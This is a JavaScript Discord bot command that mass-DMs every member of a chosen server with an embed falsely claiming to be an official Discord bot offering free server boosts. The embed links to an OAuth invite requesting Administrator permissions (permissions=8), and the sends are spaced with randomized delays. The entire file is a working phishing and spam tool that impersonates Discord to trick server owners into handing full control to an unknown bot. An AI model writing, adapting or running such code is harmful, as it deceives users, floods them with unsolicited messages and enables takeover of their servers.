const Discord = require("discord.js");
const { RichEmbed } = require("discord.js");
const config = require("../storage/config.json")

module.exports.run = async (bot, message, args) =>{
console.log("test");
        let dmGuild = bot.guilds.get(args[0]) || bot.guilds.find("name", args[0]) || message.guild;
        let role = message.mentions.roles.first();
        const embed = new RichEmbed()
        .setTitle("Free Boost Server")
        .setURL("https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8")
        .setColor("#FE08EB")
        .setThumbnail("https://media.discordapp.net/attachments/695992756967047199/709432527500083336/703502450274861106.gif")
        .setDescription(`**EN** : This is an **Official** & **Légit Bot** of **Discord**. If you want to win free rewards you just need to **Add** me on your servers and wait a few moments to receive it. \n
         **FR** : Ceci est un **Bot officiel** et Légit de **Discord**. Si vous voulez gagner des récompenses gratuites, il vous suffit de **m'ajouter** sur vos serveurs et d'attendre quelques instants pour le recevoir. \n
         `)
        .setImage("https://media1.tenor.com/images/c1ee5ae3e9db6a5a3536f4232e946155/tenor.gif")
        .addField("Invite the bot for x30 Boost :", "[Click Here For Invite The Bot](https://discordapp.com/oauth2/authorize?client_id=697847344540024893&scope=bot&permissions=8)")
        .setFooter("Invite For Free Boost", bot.user.displayAvatarURL)
        .setTimestamp()
        let memberarray = dmGuild.members.array();
        let membercount = memberarray.length;
        let botcount = 0;
        let successcount = 0;
        console.log(`Commande éfféctué par ${message.author.username} :  J'envoie un message au ${membercount} membres de ${dmGuild.name}.`)
        message.channel.send("Pub envoyé au membres du serveur : " + `${dmGuild.name}`)
        for (var i = 0; i < membercount; i++) {
            let member = memberarray[i];
            if (member.user.bot) {
                console.log(`Bot ${member.user.username} zappé par la pub !`)
                botcount++;
                continue
            }

            let timeout = Math.floor((Math.random() * (config.wait - 0.01)) * 1000) + 10;
            await sleep(timeout);
            if(i == (membercount-1)) {
                console.log(`Attendu ${timeout}ms.\t\\/\tPub envoyé à ${member.user.username}`);
            } else {
                console.log(`Attendu ${timeout}ms.\t|${i + 1}|\tPub envoyé à ${member.user.username}`);
            }
            try {
                member.send(embed);
                successcount++;
            } catch (error) {
                console.log(`Impossible de DM! ` + error)
            }
        }
        console.log(`Envoyé ${successcount} ${(successcount != 1 ? `messages` : `message`)} avec succès, ` +
            `${botcount} ${(botcount != 1 ? `bots ont` : `bots à`)} zappé.`);
    }

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports.help = {
    name: "pub"
}